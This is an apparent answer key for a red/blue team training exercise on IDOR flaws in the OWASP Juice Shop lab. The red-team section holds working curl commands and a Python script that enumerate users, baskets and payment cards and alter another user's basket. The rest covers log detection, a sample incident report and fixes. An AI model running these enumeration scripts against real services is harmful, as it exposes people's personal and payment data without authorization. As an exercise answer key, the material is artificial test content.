# Exercise 04 Answers: IDOR Attack & Defense

## 🔴 Red Team Answers

### Vulnerable Endpoints Discovered

| Endpoint | Vulnerability | Impact |
|----------|--------------|--------|
| `/rest/basket/{id}` | No authorization check | Access any user's basket |
| `/api/Users/{id}` | Partial data exposure | View user emails, roles |
| `/api/Baskets/{id}` | No authorization check | View/modify baskets |
| `/api/Cards/{id}` | No authorization check | Access saved payment cards |
| `/api/Addresss/{id}` | No authorization check | Access user addresses |
| `/api/Feedbacks/{id}` | Read access | View all feedback |

### Successful IDOR Payloads

#### Basket Access
```bash
# Get authentication token first
TOKEN=$(curl -s -X POST -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"test123"}' \
    "http://<VPS_IP>:8080/rest/user/login" | jq -r '.authentication.token')

# Access admin's basket (usually ID 1)
curl -H "Authorization: Bearer $TOKEN" \
     "http://<VPS_IP>:8080/rest/basket/1"

# Response shows admin's basket items
```

#### User Enumeration
```bash
# Get all user IDs and emails
for i in {1..20}; do
    result=$(curl -s -H "Authorization: Bearer $TOKEN" \
         "http://<VPS_IP>:8080/api/Users/$i")
    if echo "$result" | grep -q "email"; then
        echo "User $i: $(echo $result | jq -r '.email')"
    fi
done
```

**Discovered Users:**
| ID | Email | Role |
|----|-------|------|
| 1 | admin@juice-sh.op | admin |
| 2 | jim@juice-sh.op | customer |
| 3 | bender@juice-sh.op | customer |
| 4 | bjoern.kimminich@gmail.com | customer |
| ... | ... | ... |

#### Basket Modification Attack
```bash
# Add items to admin's basket
curl -X POST -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"ProductId": 24, "BasketId": 1, "quantity": 100}' \
     "http://<VPS_IP>:8080/api/BasketItems"
```

### Attack Script

```python
#!/usr/bin/env python3
"""IDOR Enumeration Script"""
import requests

BASE_URL = "http://<VPS_IP>:8080"
TOKEN = "<YOUR_TOKEN>"

headers = {"Authorization": f"Bearer {TOKEN}"}

# Enumerate baskets
print("=== Basket Enumeration ===")
for i in range(1, 20):
    r = requests.get(f"{BASE_URL}/rest/basket/{i}", headers=headers)
    if r.status_code == 200 and "Products" in r.text:
        data = r.json()
        if data.get("data", {}).get("Products"):
            print(f"Basket {i}: {len(data['data']['Products'])} items")

# Enumerate users
print("\n=== User Enumeration ===")
for i in range(1, 25):
    r = requests.get(f"{BASE_URL}/api/Users/{i}", headers=headers)
    if r.status_code == 200:
        try:
            data = r.json()
            print(f"User {i}: {data.get('email', 'N/A')} ({data.get('role', 'N/A')})")
        except:
            pass
```

---

## 🔵 Blue Team Answers

### SSH Access

```bash
ssh blueteam@<VPS_IP> -p 2222
# Password: defend123
```

### Detection Commands

#### Detect IDOR Enumeration

```bash
# Find sequential basket access
grep -E "/rest/basket/[0-9]+" /var/log/nginx/access.log | \
    awk '{print $1, $7}' | sort | uniq -c | sort -rn

# Output example:
#   15 192.168.1.100 /rest/basket/1
#   12 192.168.1.100 /rest/basket/2
#   11 192.168.1.100 /rest/basket/3
#   ... (pattern of enumeration)
```

#### Find Suspicious IPs

```bash
# IPs accessing many different IDs
grep -E "/api/(Users|Baskets|Cards)/[0-9]+" /var/log/nginx/access.log | \
    awk '{print $1}' | sort | uniq -c | sort -rn | head -5

# Example output:
#   87 192.168.1.100  <-- ATTACKER (high count)
#    3 192.168.1.50   <-- Normal user
#    2 192.168.1.51   <-- Normal user
```

#### Timeline Analysis

```bash
# Get attack timeline
grep -E "/api/Users/[0-9]+" /var/log/nginx/access.log | \
    awk '{print $1, $4, $7}' | head -20

# Count requests per minute for attack pattern
grep "192.168.1.100" /var/log/nginx/access.log | \
    awk '{print $4}' | cut -d: -f1-3 | uniq -c
```

### Detection Script

```bash
#!/bin/bash
# detect-idor.sh

LOG="/var/log/nginx/access.log"
THRESHOLD=10

echo "=== IDOR Attack Detection Report ==="
echo "Generated: $(date)"
echo ""

# Endpoints to monitor
ENDPOINTS=("Users" "Baskets" "Cards" "Addresss" "Orders" "basket")

for ep in "${ENDPOINTS[@]}"; do
    echo "--- Checking $ep endpoint ---"
    
    if [ "$ep" == "basket" ]; then
        pattern="/rest/basket/[0-9]+"
    else
        pattern="/api/$ep/[0-9]+"
    fi
    
    grep -oE "$pattern" $LOG | cut -d'/' -f4 | sort | uniq -c | sort -rn | head -5
    
    # Alert on high counts
    count=$(grep -cE "$pattern" $LOG)
    if [ "$count" -gt "$THRESHOLD" ]; then
        echo "⚠️  HIGH ACTIVITY: $count requests to $ep"
    fi
    echo ""
done

echo "--- Top Suspicious IPs ---"
grep -E "/api/[^/]+/[0-9]+" $LOG | awk '{print $1}' | sort | uniq -c | sort -rn | head -5
```

### Sample Log Entries (Attack Indicators)

```
192.168.1.100 - - [15/Jan/2024:14:30:01 +0000] "GET /rest/basket/1 HTTP/1.1" 200 523
192.168.1.100 - - [15/Jan/2024:14:30:01 +0000] "GET /rest/basket/2 HTTP/1.1" 200 234
192.168.1.100 - - [15/Jan/2024:14:30:01 +0000] "GET /rest/basket/3 HTTP/1.1" 200 128
192.168.1.100 - - [15/Jan/2024:14:30:02 +0000] "GET /rest/basket/4 HTTP/1.1" 200 456
192.168.1.100 - - [15/Jan/2024:14:30:02 +0000] "GET /rest/basket/5 HTTP/1.1" 200 321
192.168.1.100 - - [15/Jan/2024:14:30:02 +0000] "GET /api/Users/1 HTTP/1.1" 200 189
192.168.1.100 - - [15/Jan/2024:14:30:02 +0000] "GET /api/Users/2 HTTP/1.1" 200 176
...
```

**Red Flags:**
- Same IP accessing sequential IDs
- Rapid requests (multiple per second)
- Accessing many different object IDs
- Pattern: 1, 2, 3, 4, 5... (obvious enumeration)

### Kibana Query

```
# Detect IDOR patterns
message: ("/rest/basket/" OR "/api/Users/" OR "/api/Cards/") AND message: /[0-9]+

# Filter by suspicious IPs
clientip: "192.168.1.100" AND message: /api/*
```

### Sample Incident Report

```
INCIDENT REPORT: IDOR Attack Detection
=======================================
Date: 2024-01-15
Time: 14:30 - 14:45 UTC
Duration: 15 minutes

ATTACKER IDENTIFICATION
-----------------------
IP Address: 192.168.1.100
User Agent: curl/7.88.1

ATTACK SUMMARY
--------------
Total Suspicious Requests: 127
Endpoints Targeted:
  - /rest/basket/: 45 requests (IDs 1-45)
  - /api/Users/: 52 requests (IDs 1-52)
  - /api/Cards/: 20 requests (IDs 1-20)
  - /api/Addresss/: 10 requests (IDs 1-10)

IMPACT ASSESSMENT
-----------------
Severity: HIGH
Data Potentially Exposed:
  - Shopping basket contents for ~45 users
  - User email addresses for ~52 users
  - Payment card details (partial) for ~20 users
  - Home addresses for ~10 users

INDICATORS OF COMPROMISE
------------------------
- Sequential ID enumeration pattern
- High request rate (8.5 requests/second)
- Single IP accessing many different user resources
- Automated tool signature (curl user-agent)

RECOMMENDED ACTIONS
-------------------
1. Block IP 192.168.1.100 at WAF/firewall level
2. Implement rate limiting on sensitive API endpoints
3. Add authorization checks to verify object ownership
4. Consider using UUIDs instead of sequential IDs
5. Enable alerting for enumeration patterns

DETECTION RULES CREATED
-----------------------
- Alert when single IP accesses >10 different IDs on same endpoint
- Alert when >5 requests/second to /api/* endpoints
- Alert on sequential ID access pattern
```

---

## 🔧 Mitigation Implementation

### Quick Fix (nginx rate limiting)

```nginx
# Add to nginx.conf
limit_req_zone $binary_remote_addr zone=api_limit:10m rate=10r/s;

location /api/ {
    limit_req zone=api_limit burst=20 nodelay;
    proxy_pass http://juice-shop:3000;
}

location /rest/basket/ {
    limit_req zone=api_limit burst=5 nodelay;
    proxy_pass http://juice-shop:3000;
}
```

### Application-Level Fix

```javascript
// Proper authorization middleware
const checkOwnership = (resourceType) => {
    return async (req, res, next) => {
        const resourceId = req.params.id;
        const userId = req.user.id;
        
        const resource = await db[resourceType].findById(resourceId);
        
        if (!resource) {
            return res.status(404).json({error: 'Not found'});
        }
        
        if (resource.userId !== userId && req.user.role !== 'admin') {
            // Log unauthorized access attempt
            logger.warn(`IDOR attempt: User ${userId} tried to access ${resourceType}/${resourceId}`);
            return res.status(403).json({error: 'Unauthorized'});
        }
        
        req.resource = resource;
        next();
    };
};

// Apply to routes
app.get('/api/basket/:id', authenticate, checkOwnership('Basket'), getBasket);
app.get('/api/address/:id', authenticate, checkOwnership('Address'), getAddress);
```
